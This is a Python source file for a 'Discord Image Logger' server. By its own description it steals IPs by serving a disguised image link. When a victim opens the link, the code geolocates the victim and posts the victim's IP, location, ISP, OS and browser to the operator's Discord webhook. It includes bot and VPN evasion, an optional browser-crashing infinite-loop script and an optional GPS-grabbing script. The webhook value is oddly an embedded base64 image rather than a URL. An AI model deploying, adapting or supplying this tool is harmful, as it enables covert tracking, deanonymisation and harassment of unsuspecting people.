# Image Logger
# By Team C00lB0i/C00lB0i | https://github.com/OverPowerC

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "C00lB0i"

config = {
    # BASE CONFIG #
    "webhook": "data:image/jpeg;base64,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",
    "image": "https://cestpourletest.vercel.app/", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by C00lB0i's Image Logger. https://github.com/OverPowerC", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/OverPower/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
